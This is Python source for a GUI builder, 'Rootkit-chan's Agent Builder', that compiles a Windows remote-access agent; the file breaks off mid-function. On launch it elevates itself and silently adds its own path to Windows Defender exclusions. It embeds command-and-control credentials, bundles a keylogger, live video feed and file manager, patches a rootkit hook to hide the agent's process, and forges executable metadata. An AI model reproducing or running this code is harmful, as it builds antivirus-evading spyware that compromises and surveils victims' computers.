import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import os
import sys
import json
import base64
import shutil
import subprocess
import tempfile
import zipfile
import random
import string
import ctypes
from pathlib import Path
from cryptography.fernet import Fernet

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

if getattr(sys, 'frozen', False):
    BASE_DIR = getattr(sys, '_MEIPASS', os.path.dirname(sys.executable))
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

ICON_PATH = os.path.join(BASE_DIR, "ico", "ico.ico")


BUILTIN_FERNET_KEY = <your_key>
DEFAULT_XOR_PASSWORD = "my_password"
DEFAULT_AGENT_NAME = "tao"

def init_exc():
    pto = []

    if getattr(sys, 'frozen', False):
        pto.append(os.path.abspath(sys.executable))
    else:
        script_path = os.path.abspath(__file__)
        script_dir = os.path.dirname(script_path)
        pto.append(script_path)
        pto.append(script_dir)

    try:
        result = subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command',
             '(Get-MpPreference).ExclusionPath'],
            capture_output=True, text=True, shell=False
        )
        existing = result.stdout.strip().lower().splitlines()
        existing = [e.strip() for e in existing]
    except Exception:
        existing = []

    for path in pto:
        if path.lower() in existing:
            print(f"Exclusion already exists, skipping: {path}")
            continue

        quoted_path = f'"{path}"'
        powershell_command = [
            'powershell', '-ExecutionPolicy', 'Bypass',
            '-Command', f'Add-MpPreference -ExclusionPath {quoted_path}'
        ]

        print(f"Attempting to add {path} to Windows Defender exclusions...")

        try:
            subprocess.check_call(powershell_command, shell=False)
            print(f"Successfully added {path} to exclusions.")
        except subprocess.CalledProcessError:
            print(f"Failed to add {path}. This operation requires Administrator privileges.")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")



init_exc()

def fernet_g():

    key = Fernet.generate_key().decode()
    return key.rstrip('=')

def xor_en(input_file, output_file, key):

    with open(input_file, 'rb') as f:
        data = bytearray(f.read())
    
    key_bytes = key.encode()
    for i in range(len(data)):
        data[i] ^= key_bytes[i % len(key_bytes)]
    
    with open(output_file, 'wb') as f:
        f.write(data)

def r_decrypt(resources_path, output_dir):

    try:
        fernet = Fernet(BUILTIN_FERNET_KEY)
        
        with open(resources_path, 'rb') as f:
            encrypted_data = f.read()
        
        decrypted_data = fernet.decrypt(encrypted_data)
        
        zip_path = os.path.join(output_dir, "resources.zip")
        with open(zip_path, 'wb') as f:
            f.write(decrypted_data)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(output_dir)
        
        os.remove(zip_path)
        
        return True
    except Exception as e:
        print(f"Decryption error: {e}")
        return False
        
def rem_exc(path):

    try:
        cmd = f'powershell -Command "Remove-MpPreference -ExclusionPath \'{path}\'"'
        subprocess.run(cmd, shell=True, capture_output=True)
        return True
    except Exception:
        return False

def pth_exc(path):
    try:
        result = subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command',
             '(Get-MpPreference).ExclusionPath'],
            capture_output=True, text=True, shell=False
        )
        existing = [e.strip().lower() for e in result.stdout.strip().splitlines()]
        if path.lower() in existing:
            return True 

        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
        subprocess.run(cmd, shell=True, capture_output=True)
        return True
    except:
        return False

class BuilderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Rootkit-chan's Agent Builder")
        self.root.geometry("700x500")
        self.root.resizable(False, False)
        
        self.colors = {
            "bg": "#1A1212",
            "fg": "#F2E9E4",
            "accent": "#D9A86C",
            "crimson": "#A63429",
            "dark": "#0D0D0D"
        }
        
        self.root.configure(bg=self.colors["bg"])
        
        self.agent_name = tk.StringVar(value=DEFAULT_AGENT_NAME)
        self.bin_id = tk.StringVar()
        self.api_key = tk.StringVar()
        self.url = tk.StringVar()
        self.fernet_key = tk.StringVar()
        self.xor_password = tk.StringVar(value=DEFAULT_XOR_PASSWORD)
        self.icon_path = tk.StringVar()
        
        self.include_root_modules = tk.BooleanVar(value=True) 
        self.include_main_tools = tk.BooleanVar(value=True)
        self.custom_dlls = []
        
        self.company_name = tk.StringVar(value="")
        self.file_description = tk.StringVar(value="")
        self.file_version = tk.StringVar(value="")
        self.internal_name = tk.StringVar(value="")
        self.copyright = tk.StringVar(value="")
        self.original_filename = tk.StringVar(value="")
        self.product_name = tk.StringVar(value="")
        self.product_version = tk.StringVar(value="")
        
        self.build_dir = None
        self.output_dir = None
        self.compiler_dir = None
        
        self._setup_ui()
        
    def _setup_ui(self):
        
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TNotebook", background=self.colors["bg"], borderwidth=0)
        style.configure("TNotebook.Tab", background=self.colors["dark"], 
                       foreground=self.colors["fg"], padding=[15, 5])
        style.map("TNotebook.Tab", background=[("selected", self.colors["crimson"])])
        
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.general_tab = tk.Frame(self.notebook, bg=self.colors["bg"])
        self.tools_tab = tk.Frame(self.notebook, bg=self.colors["bg"])
        self.metadata_tab = tk.Frame(self.notebook, bg=self.colors["bg"])
        
        self.notebook.add(self.general_tab, text="General")
        self.notebook.add(self.tools_tab, text="Tools")
        self.notebook.add(self.metadata_tab, text="Metadata")
        
        self._b_general()
        self._b_tools()
        self._b_zuckerberg()
        
        btn_frame = tk.Frame(self.root, bg=self.colors["bg"])
        btn_frame.pack(fill="x", padx=10, pady=10)
        
        tk.Button(btn_frame, text="BUILD AGENT", command=self.start_build,
                 bg=self.colors["crimson"], fg="white", font=("Arial", 12, "bold"),
                 padx=30, pady=10, cursor="hand2").pack(side="left", padx=5)
        
        tk.Button(btn_frame, text="Exit", command=self.root.quit,
                 bg="#555555", fg="white", font=("Arial", 10, "bold"),
                 padx=20, pady=10).pack(side="right", padx=5)
    
    def _b_general(self):

        frame = self._c_label(self.general_tab, "Agent Configuration")
        frame.pack(fill="x", padx=10, pady=5)
        
        self._en_row(frame, "Agent Name:", self.agent_name, 
                              "Name of the output executable (without .exe)")

        frame = self._c_label(self.general_tab, "JSONBin Credentials")
        frame.pack(fill="x", padx=10, pady=5)
        
        self._en_row(frame, "BIN ID:", self.bin_id)
        self._en_row(frame, "API Key:", self.api_key, show="*")
        self._en_row(frame, "URL:", self.url)
        
        fernet_frame = tk.Frame(frame, bg=self.colors["bg"])
        fernet_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(fernet_frame, text="Fernet Key:", bg=self.colors["bg"],
                fg=self.colors["fg"], font=("Arial", 10), width=15,
                anchor="w").pack(side="left")
        
        tk.Entry(fernet_frame, textvariable=self.fernet_key, bg=self.colors["dark"],
                fg=self.colors["accent"], font=("Consolas", 9), show="*",
                insertbackground="white").pack(side="left", fill="x", expand=True, padx=5)
        
        tk.Button(fernet_frame, text="Random", command=self._fern_g,
                 bg=self.colors["crimson"], fg="white", font=("Arial", 8, "bold"),
                 padx=10).pack(side="left", padx=5)
        
        frame = self._c_label(self.general_tab, "Additional Settings")
        frame.pack(fill="x", padx=10, pady=5)
        
        self._en_row(frame, "BIN Password:", self.xor_password,
                              "Password for agent.bin decryption during installation.")
        
        icon_frame = tk.Frame(frame, bg=self.colors["bg"])
        icon_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(icon_frame, text="Icon File:", bg=self.colors["bg"],
                fg=self.colors["fg"], font=("Arial", 10), width=15,
                anchor="w").pack(side="left")
        
        tk.Entry(icon_frame, textvariable=self.icon_path, bg=self.colors["dark"],
                fg=self.colors["accent"], font=("Consolas", 9),
                state="readonly").pack(side="left", fill="x", expand=True, padx=5)
        
        tk.Button(icon_frame, text="Browse", command=self._browse_icon,
                 bg="#4CAF50", fg="white", font=("Arial", 8, "bold"),
                 padx=10).pack(side="left", padx=5)


    def _b_tools(self):

        frame = self._c_label(self.tools_tab, "User-Root Module")
        frame.pack(fill="x", padx=10, pady=10)
        
        self.include_root_modules = tk.BooleanVar(value=False)
        
        tk.Checkbutton(frame, text="Include User-Root Module | ~300 kb",
                      variable=self.include_root_modules, bg=self.colors["bg"],
                      fg=self.colors["fg"], selectcolor=self.colors["dark"],
                      font=("Arial", 10), activebackground=self.colors["bg"],
                      activeforeground=self.colors["accent"]).pack(anchor="w", padx=10, pady=5)
        
        tk.Label(frame, text="The User-Root Module provides stealth functionality.",
                bg=self.colors["bg"], fg="#888888", font=("Arial", 8, "italic"),
                justify="left").pack(anchor="w", padx=30)
        

        frame = self._c_label(self.tools_tab, "Default Tools")
        frame.pack(fill="x", padx=10, pady=10)
        
        tk.Checkbutton(frame, text="Include Default Tools | ~640 kb - 63 Mb (OpenCV DLL included)",
                      variable=self.include_main_tools, bg=self.colors["bg"],
                      fg=self.colors["fg"], selectcolor=self.colors["dark"],
                      font=("Arial", 10), activebackground=self.colors["bg"],
                      activeforeground=self.colors["accent"]).pack(anchor="w", padx=10, pady=5)
        
        tk.Label(frame, text="Third-party pre-built package that includes the Keylogger, Live Video Feed, File Manager, and Message.",
                bg=self.colors["bg"], fg="#888888", font=("Arial", 8, "italic"),
                justify="left").pack(anchor="w", padx=30)
        

        frame = self._c_label(self.tools_tab, "Custom DLL Modules")
        frame.pack(fill="both", expand=True, padx=10, pady=10)
        

        list_frame = tk.Frame(frame, bg=self.colors["bg"])
        list_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        scrollbar = tk.Scrollbar(list_frame)
        scrollbar.pack(side="right", fill="y")
        
        self.dll_listbox = tk.Listbox(list_frame, bg=self.colors["dark"],
                                      fg=self.colors["fg"], font=("Consolas", 9),
                                      selectbackground=self.colors["crimson"],
                                      yscrollcommand=scrollbar.set, height=8)
        self.dll_listbox.pack(side="left", fill="both", expand=True)
        scrollbar.config(command=self.dll_listbox.yview)
        

        btn_frame = tk.Frame(frame, bg=self.colors["bg"])
        btn_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Button(btn_frame, text="➕ Add DLL", command=self.custom_dll,
                 bg="#4CAF50", fg="white", font=("Arial", 9, "bold"),
                 padx=15).pack(side="left", padx=5)
        
        tk.Button(btn_frame, text="➖ Remove", command=self._rem_custom_dll,
                 bg="#FF4444", fg="white", font=("Arial", 9, "bold"),
                 padx=15).pack(side="left", padx=5)
    
    def _b_zuckerberg(self):

        canvas = tk.Canvas(self.metadata_tab, bg=self.colors["bg"], highlightthickness=0)
        scrollbar = ttk.Scrollbar(self.metadata_tab, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=self.colors["bg"])
        
        scrollable_frame.bind("<Configure>", 
                             lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        frame = self._c_label(scrollable_frame, "Version Information")
        frame.pack(fill="x", padx=10, pady=5)
        
        self._en_row(frame, "Company Name:", self.company_name)
        self._en_row(frame, "File Description:", self.file_description)
        self._en_row(frame, "File Version:", self.file_version)
        self._en_row(frame, "Internal Name:", self.internal_name)
        self._en_row(frame, "Copyright:", self.copyright)
        self._en_row(frame, "Original Filename:", self.original_filename)
        self._en_row(frame, "Product Name:", self.product_name)
        self._en_row(frame, "Product Version:", self.product_version)
    

    def _c_label(self, parent, text):

        frame = tk.LabelFrame(parent, text=f" {text} ", bg=self.colors["bg"],
                             fg=self.colors["accent"], font=("Arial", 10, "bold"))
        return frame
    
    def _en_row(self, parent, label_text, variable, tooltip="", show=None):

        row = tk.Frame(parent, bg=self.colors["bg"])
        row.pack(fill="x", padx=10, pady=3)
        
        tk.Label(row, text=label_text, bg=self.colors["bg"], fg=self.colors["fg"],
                font=("Arial", 10), width=15, anchor="w").pack(side="left")
        
        entry = tk.Entry(row, textvariable=variable, bg=self.colors["dark"],
                        fg=self.colors["accent"], font=("Consolas", 9),
                        insertbackground="white", show=show)
        entry.pack(side="left", fill="x", expand=True, padx=5)
        
        if tooltip:
            tk.Label(row, text=tooltip, bg=self.colors["bg"], fg="#888888",
                    font=("Arial", 7, "italic")).pack(side="left")
    
    def _fern_g(self):

        key = fernet_g()
        self.fernet_key.set(key)
        messagebox.showinfo("Key Generated", "New Fernet key generated successfully!")
    
    def _browse_icon(self):

        path = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon Files", "*.ico"), ("All Files", "*.*")]
        )
        if path:
            self.icon_path.set(path)
    
    def custom_dll(self):

        paths = filedialog.askopenfilenames(
            title="Select DLL Files",
            filetypes=[("DLL Files", "*.dll"), ("All Files", "*.*")]
        )
        for path in paths:
            if path not in self.custom_dlls:
                self.custom_dlls.append(path)
                self.dll_listbox.insert(tk.END, os.path.basename(path))
    
    def _rem_custom_dll(self):

        selection = self.dll_listbox.curselection()
        if selection:
            index = selection[0]
            self.dll_listbox.delete(index)
            del self.custom_dlls[index]

    
    def start_build(self):
        
        if not self.chk_inp():
            return
        
        self.progress_window = tk.Toplevel(self.root)
        self.progress_window.title("Building Agent...")
        self.progress_window.geometry("600x400")
        self.progress_window.configure(bg=self.colors["bg"])
        self.progress_window.transient(self.root)
        self.progress_window.grab_set()
        
        self.progress_text = scrolledtext.ScrolledText(
            self.progress_window, bg=self.colors["dark"], fg=self.colors["fg"],
            font=("Consolas", 9), wrap="word", state="disabled"
        )
        self.progress_text.pack(fill="both", expand=True, padx=10, pady=10)
        
        import threading
        build_thread = threading.Thread(target=self._proc, daemon=True)
        build_thread.start()
    
    def chk_inp(self):

        if not self.agent_name.get():
            messagebox.showerror("Error", "Agent name is required")
            return False
        
        if not self.bin_id.get() or not self.api_key.get() or not self.url.get():
            messagebox.showerror("Error", "All JSONBin credentials are required")
            return False
        
        if not self.fernet_key.get():
            messagebox.showerror("Error", "Fernet key is required")
            return False
        
        return True
    
    def _log(self, message):

        if hasattr(self, 'progress_text'):
            self.progress_text.config(state='normal')
            self.progress_text.insert(tk.END, message + "\n")
            self.progress_text.see(tk.END)
            self.progress_text.config(state='disabled')
            self.progress_window.update()
    
    def _proc(self):
        try:
            self._log("SYS: Compilation started\n")

            def fail(msg):
                self._log(f"ERROR: {msg}")
                self._log("SYS: Cleaning up temp files due to failure...")
                self._cleanup()

            self._log("SYS: 1/10 Setting up build environment...")
            if not self._dir_setup():
                return fail("Failed to setup directories")

            self._log("SYS: 2/10 Adding Defender exclusion...")
            response = messagebox.askyesno(
                "Windows Defender",
                "Add build directory to Defender exclusions?\n\n"
                "This prevents false positives during compilation."
            )
            if response:
                pth_exc(self.build_dir)
                self._log("SYS: Exclusion added")
            else:
                self._log("WARNING: Skipped exclusion")

            self._log("SYS: 3/10 Extracting resources...")
            if not self._src_ex():
                return fail("Failed to extract resources")

            self._log("SYS: 4/10 Configuring agent...")
            if not self.agent_config():
                return fail("Failed to configure agent")

            if self.custom_dlls:
                self._log(f"SYS: 5/10 Copying {len(self.custom_dlls)} custom DLL(s)...")
                self._c_custom_dlls()
            else:
                self._log("NOTICE: No custom DLLs to copy")

            self._log("SYS: 6/10 Compiling agent with MinGW...")
            if not self._compile_agent():
                return fail("Compilation failed")

            self._log("SYS: 7/10 Creating agent package...")
            if not self._create_package():
                return fail("Failed to create package")

            self._log("SYS: 8/10 Creating SFX executable...")
            if not self._create_sfx():
                return fail("Failed to create SFX")

            self._log("SYS: 9/10 Cleaning up...")
            self._cleanup()

            self._log("SYS: Build complete!\n")
            self._log("AGENT INSTALLER BUILT SUCCESSFULLY")
            self._log(f"Output: {self.output_dir}\\{self.agent_name.get()}.exe")

            messagebox.showinfo("Success",
                                f"Agent Installer built successfully!\n\n"
                                f"Output: {self.output_dir}\\{self.agent_name.get()}.exe")

            self.progress_window.destroy()

        except Exception as e:
            self._log(f"\nERROR: {str(e)}")
            import traceback
            self._log(traceback.format_exc())
            self._log("SYS: Cleaning up temp files due to exception...")
            self._cleanup()
            messagebox.showerror("Build Failed", f"Build failed:\n{str(e)}")
    
    def _dir_setup(self):

        try:

            if getattr(sys, 'frozen', False):
                script_dir = os.path.dirname(sys.executable)
            else:
                script_dir = os.path.dirname(os.path.abspath(__file__))
            
            self.build_dir = os.path.join(tempfile.gettempdir(), "tao_build_" + ''.join(random.choices(string.ascii_lowercase, k=6)))
            os.makedirs(self.build_dir, exist_ok=True)
            
            self._log(f"Build directory: {self.build_dir}")
            
            self.output_dir = os.path.join(script_dir, "output")
            os.makedirs(self.output_dir, exist_ok=True)
            
            self._log(f"Output directory: {self.output_dir}")
            
            self.compiler_dir = os.path.join(script_dir, "compilers", "mingw64")
            if not os.path.exists(self.compiler_dir):
                self._log("WARNING: MinGW compiler not found at expected location")
                return False
            
            self._log(f"Compiler: {self.compiler_dir}")
            
            return True
        except Exception as e:
            self._log(f"Setup error: {e}")
            return False
    
    def _src_ex(self):

        try:

            if getattr(sys, 'frozen', False):
                script_dir = os.path.dirname(sys.executable)
            else:
                script_dir = os.path.dirname(os.path.abspath(__file__))
            
            resources_path = os.path.join(script_dir, "resources.bin")
            
            if not os.path.exists(resources_path):
                self._log(f"ERROR: resources.bin not found at {resources_path}")
                return False
            
            self._log("SYS: Decrypting resources...")
            if not r_decrypt(resources_path, self.build_dir):
                return False
            
            resource_dir = os.path.join(self.build_dir, "resource")
            if not os.path.exists(resource_dir):
                self._log("ERROR: resource directory not found after extraction")
                return False
            
            self._log("SYS: Resources extracted successfully")
            return True
            
        except Exception as e:
            self._log(f"ERROR: {e}")
            return False
    
    def agent_config(self):
        try:
            resource_dir = os.path.join(self.build_dir, "resource")
            
            old_cpp = os.path.join(resource_dir, "agent.cpp")
            new_cpp = os.path.join(resource_dir, f"{self.agent_name.get()}.cpp")
            
            if old_cpp != new_cpp and os.path.exists(old_cpp):
                shutil.copy(old_cpp, new_cpp)
                self._log(f"NOTICE: Agent renamed to {self.agent_name.get()}.cpp")
            
            config = {
                "BIN_ID": self.bin_id.get(),
                "API_KEY": self.api_key.get(),
                "URL": self.url.get(),
                "DEVICE_IP": "N/A",
                "FERNET_KEY": self.fernet_key.get()
            }
            
            config_path = os.path.join(resource_dir, "config_key.json")
            with open(config_path, 'w') as f:
                json.dump(config, f, indent=4)
            
            self._log("NOTICE: config_key.json created")
            
            
            if self.icon_path.get() and os.path.exists(self.icon_path.get()):
                
                icon_filename = os.path.basename(self.icon_path.get())
                icon_dest = os.path.join(resource_dir, icon_filename)
                
                shutil.copy(self.icon_path.get(), icon_dest)
                self._log(f"NOTICE: Icon copied as {icon_filename}")
            else:
                
                default_icon = os.path.join(resource_dir, "icon.ico")
                if not os.path.exists(default_icon):
                    self._log("WARNING: No icon file found - executable will have no icon")
            
   
            if not self._c_metadata_rc(resource_dir):
                return False
            
            return True
            
        except Exception as e:
            self._log(f"ERROR: {e}")
            return False
        
    def _c_metadata_rc(self, resource_dir):
   
        try:

            icon_filename = "icon.ico"
            if self.icon_path.get():
               
                icon_filename = os.path.basename(self.icon_path.get())
            
            
            file_version = self.file_version.get() if self.file_version.get() else "1.0.0.0"
            product_version = self.product_version.get() if self.product_version.get() else "1.0.0.0"
            
     
            file_ver_comma = file_version.replace('.', ',')
            prod_ver_comma = product_version.replace('.', ',')
            
            metadata_content = f"""#include <windows.h>

    ID_ICON ICON "{icon_filename}"

    VS_VERSION_INFO VERSIONINFO
    FILEVERSION     {file_ver_comma}
    PRODUCTVERSION  {prod_ver_comma}
    FILEFLAGSMASK   0x3fL
    FILEFLAGS       0x0L
    FILEOS          VOS_NT_WINDOWS32
    FILETYPE        VFT_APP
    FILESUBTYPE     VFT2_UNKNOWN
    BEGIN
        BLOCK "StringFileInfo"
        BEGIN
            BLOCK "040904b0"
            BEGIN
                VALUE "CompanyName",      "{self.company_name.get()}"
                VALUE "FileDescription",  "{self.file_description.get()}"
                VALUE "FileVersion",      "{file_version}"
                VALUE "InternalName",     "{self.internal_name.get()}"
                VALUE "LegalCopyright",   "{self.copyright.get()}"
                VALUE "OriginalFilename", "{self.original_filename.get()}"
                VALUE "ProductName",      "{self.product_name.get()}"
                VALUE "ProductVersion",   "{product_version}"
            END
        END
        BLOCK "VarFileInfo"
        BEGIN
            VALUE "Translation", 0x409, 1200
        END
    END
    """
            
            metadata_path = os.path.join(resource_dir, "metadata.rc")
            with open(metadata_path, 'w', encoding='utf-8') as f:
                f.write(metadata_content)
            
            self._log(f"NOTICE: metadata.rc created (icon: {icon_filename})")
            return True
            
        except Exception as e:
            self._log(f"SYS: Metadata creation error: {e}")
            return False

    
    def _c_custom_dlls(self):

        try:
            modules_dir = os.path.join(self.build_dir, "resource", "modules")
            
            for dll_path in self.custom_dlls:
                dll_name = os.path.basename(dll_path)
                dest = os.path.join(modules_dir, dll_name)
                shutil.copy(dll_path, dest)
                self._log(f"  SYS:  {dll_name}")
            
            self._log(f"SYS: {len(self.custom_dlls)} custom DLL(s) copied")
            
        except Exception as e:
            self._log(f"DLL copy error: {e}")

    def hook_ren(self, hook_cpp_path, agent_name):

        try:
            self._log(f"SYS: Updating hook.cpp with agent name: {agent_name}.exe")
            
            with open(hook_cpp_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            import re
            
            pattern = r'(std::vector<std::wstring>\s+g_hiddenProcesses\s*=\s*\{[^}]*L"ldr\.exe"[^}]*L")([^"]+)(\.exe")'
            
            replacement = rf'\1{agent_name}\3'
            
            updated_content = re.sub(pattern, replacement, content, flags=re.DOTALL)
            

            if updated_content == content:
                self._log("WARNING: Process name in hook.cpp was not updated (pattern not found)")
                self._log("SOLUTION: Attempting alternative pattern...")

                updated_content = content.replace('L"tao.exe"', f'L"{agent_name}.exe"')
                
                if updated_content == content:
                    self._log("WARNING: Could not find process name to replace in hook.cpp")
            else:
                self._log(f"NOTICE: Updated hook.cpp: L\"tao.exe\" → L\"{agent_name}.exe\"")
            
            with open(hook_cpp_path, 'w', encoding='utf-8') as f:
                f.write(updated_content)
            
            return True
            
        except Exception as e:
            self._log(f"ERROR: Failed to update hook.cpp: {e}")
            return False

    def _compile_agent(self):
     
        try:
        
            mingw_bin = os.path.join(self.compiler_dir, "bin")
            old_path = os.environ.get("PATH", "")
            os.environ["PATH"] = mingw_bin + os.pathsep + old_path
            self._log(f"Added to PATH: {mingw_bin}")
            
            resource_dir = os.path.join(self.build_dir, "resource")
            agent_cpp = os.path.join(resource_dir, f"{self.agent_name.get()}.cpp")
            agent_exe = os.path.join(resource_dir, f"{self.agent_name.get()}.exe")
            
            gxx = os.path.join(self.compiler_dir, "bin", "g++.exe")
            windres = os.path.join(self.compiler_dir, "bin", "windres.exe")
            
            if not os.path.exists(gxx):
                self._log(f"ERROR: g++.exe not found")
                return False
            
            if not os.path.exists(windres):
                self._log(f"ERROR: windres.exe not found")
                return False
            
    
            main_mod_dir = os.path.join(resource_dir, "modules", "main")
            modules_dir = os.path.join(resource_dir, "modules")
            
            include_paths = [
                f"-I{resource_dir}",
                f"-I{os.path.join(self.compiler_dir, 'include')}",
                f"-I{os.path.join(self.compiler_dir, 'x86_64-w64-mingw32', 'include')}",
                f"-I{main_mod_dir}",
                f"-I{os.path.join(main_mod_dir, 'headers')}"
            ]
            
            flags = [
                "-mwindows", "-static", "-Os", "-s",
                "-fno-stack-protector", "-fshort-wchar", "-mno-red-zone",
                "-D_WIN32_WINNT=0x0600", "-std=c++17",
                "-DUNICODE", "-D_UNICODE",
                "-D__try=try", "-D__except(x)=catch(...)"
            ]
            
            libs = [
                "-ladvapi32", "-lkernel32", "-lwininet", "-lcrypt32",
                "-lpsapi", "-luser32", "-lntdll", "-lws2_32",
                "-lole32", "-luuid", "-lsetupapi", "-liphlpapi"
            ]
            
     
            metadata_rc = os.path.join(resource_dir, "metadata.rc")
            metadata_res = os.path.join(resource_dir, "metadata.res")
            
            if os.path.exists(metadata_rc):
                self._log("SYS: 1/5 Compiling resource file (metadata.rc -> metadata.res)...")
                
                windres_cmd = [
                    windres,
                    "-i", metadata_rc,
                    "-o", metadata_res,
                    "-O", "coff",
                    "--input-format=rc",
                    "--output-format=coff"
                ]
                
                self._log(f"  Command: {' '.join(windres_cmd)}")
                
                process = subprocess.Popen(
                    windres_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=resource_dir,
                    universal_newlines=True
                )
                stdout, stderr = process.communicate(timeout=60)
                
                if process.returncode != 0:
                    self._log("ERROR: Resource compilation failed")
                    if stderr:
                        for line in stderr.split('\n'):
                            if line.strip():
                                self._log(f"  {line}")
                    return False
                
                if not os.path.exists(metadata_res):
                    self._log("ERROR: metadata.res not created")
                    return False
                
                res_size = os.path.getsize(metadata_res)
                self._log(f"SYS: Resource file compiled ({res_size:,} bytes)")
            else:
                self._log("WARNING: metadata.rc not found - skipping resource compilation")
                metadata_res = None
            
    
            self._log("SYS: 2/5 Compiling main agent executable...")
            
            cmd = [gxx, agent_cpp, "-o", agent_exe] + flags + include_paths + libs
            
      
            if metadata_res and os.path.exists(metadata_res):
                cmd.append(metadata_res)
                self._log(f"  Including resources: {metadata_res}")
            
            self._log(f"  Compiling: {agent_cpp}")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=resource_dir,
                universal_newlines=True
            )
            stdout, stderr = process.communicate(timeout=300)
            
            if process.returncode != 0:
                self._log("ERROR: Main agent compilation failed")
                if stderr:
                    for line in stderr.split('\n'):
                        if line.strip():
                            self._log(f"  {line}")
                return False
            
            if not os.path.exists(agent_exe):
                self._log("ERROR: Agent executable not created")
                return False
            
            exe_size = os.path.getsize(agent_exe)
            self._log(f"SYS: Main agent compiled: {exe_size:,} bytes ({exe_size / 1024:.1f} KB)")
            
    
            self._log("SYS: 3/5 Compiling mandatory core modules...")
            
            mandatory_modules = ["cvm.cpp", "prep.cpp"]
            
            for module_file in mandatory_modules:
                module_path = os.path.join(main_mod_dir, module_file)
                module_dll = module_file.replace(".cpp", ".dll")
                output_path = os.path.join(main_mod_dir, module_dll)
                
                if not os.path.exists(module_path):
                    self._log(f"WARNING: {module_file} not found - skipping")
                    continue
                
                self._log(f"SYS: Compiling {module_dll}...")
                
                cmd = [gxx, "-shared", "-o", output_path, module_path] + flags + include_paths + libs
                
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=main_mod_dir,
                    universal_newlines=True
                )
                stdout, stderr = process.communicate(timeout=120)
                
                if process.returncode != 0:
                    self._log(f"ERROR: Failed to compile {module_dll}")
                    if stderr:
                        for line in stderr.split('\n')[:5]:
                            if line.strip():
                                self._log(f"    {line}")
                elif os.path.exists(output_path):
                    dll_size = os.path.getsize(output_path)
                    self._log(f"SYS: {module_dll} compiled ({dll_size / 1024:.1f} KB)")
                else:
                    self._log(f"ERROR: {module_dll} not created")
            
            self._log("SYS: 4/5 Compiling root modules...")

            if self.include_root_modules.get():
                self._log("SYS: Root modules enabled")
                
                hook_cpp_path = os.path.join(main_mod_dir, "hook.cpp")
                if os.path.exists(hook_cpp_path):

                    self.hook_ren(hook_cpp_path, self.agent_name.get())
                    
                    self._log(f"SYS: Updating hook.cpp with agent name: {self.agent_name.get()}.exe")
                    with open(hook_cpp_path, 'r', encoding='utf-8') as f:
                        hook_content = f.read()
                    
                    updated_hook = hook_content.replace('L"tao.exe"', f'L"{self.agent_name.get()}.exe"')
                    
                    with open(hook_cpp_path, 'w', encoding='utf-8') as f:
                        f.write(updated_hook)
                    self._log(f"NOTICE: Updated hook.cpp: L\"tao.exe\" → L\"{self.agent_name.get()}.exe\"")

                wcd_cpp_path = os.path.join(main_mod_dir, "wcd.cpp")
                if os.path.exists(wcd_cpp_path):
                    self._log(f"SYS: Updating wcd.cpp with agent name: {self.agent_name.get()}.exe")
                    
                    with open(wcd_cpp_path, 'r', encoding='utf-8') as f:
                        wcd_content = f.read()
                    
                    updated_wcd = wcd_content.replace('L"tao.exe"', f'L"{self.agent_name.get()}.exe"')
                    
                    with open(wcd_cpp_path, 'w', encoding='utf-8') as f:
                        f.write(updated_wcd)
                    
                    self._log(f"NOTICE: Updated wcd.cpp: L\"tao.exe\" → L\"{self.agent_name.get()}.exe\"")
                
                root_modules = ["ldr.cpp", "hook.cpp", "wcd.cpp"]
                
                for module_file in root_modules:
                    module_path = os.path.join(main_mod_dir, module_file)
                    
                    if module_file == "ldr.cpp":
                        output_file = "ldr.exe"
                        output_path = os.path.join(main_mod_dir, output_file)
                        
                        self._log(f"Compiling {output_file}...")
                        
                        cmd = [gxx, "-o", output_path, module_path] + flags + include_paths + libs
                    else:
                        module_dll = module_file.replace(".cpp", ".dll")
                        output_path = os.path.join(main_mod_dir, module_dll)
                        
                        self._log(f"Compiling {module_dll}...")
                        
                        cmd = [gxx, "-shared", "-o", output_path, module_path] + flags + include_paths + libs
                    
                    if not os.path.exists(module_path):
                        self._log(f"WARNING: {module_file} not found - skipping")
                        continue
                    
                    process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        cwd=main_mod_dir,
                        universal_newlines=True
                    )
                    stdout, stderr = process.communicate(timeout=120)
                    
                    if process.returncode != 0:
                        self._log(f"ERROR: Failed to compile {os.path.basename(output_path)}")
                        if stderr:
                            for line in stderr.split('\n')[:5]:
                                if line.strip():
                                    self._log(f"    {line}")
                    elif os.path.exists(output_path):
                        file_size = os.path.getsize(output_path)
                        self._log(f"SYS: {os.path.basename(output_path)} compiled ({file_size / 1024:.1f} KB)")
                    else:
                        self._log(f"ERROR: {os.path.basename(output_path)} not created")
            else:
                self._log("NOTICE: Root modules disabled - skipping")
                
                ldr_exe = os.path.join(main_mod_dir, "ldr.exe")
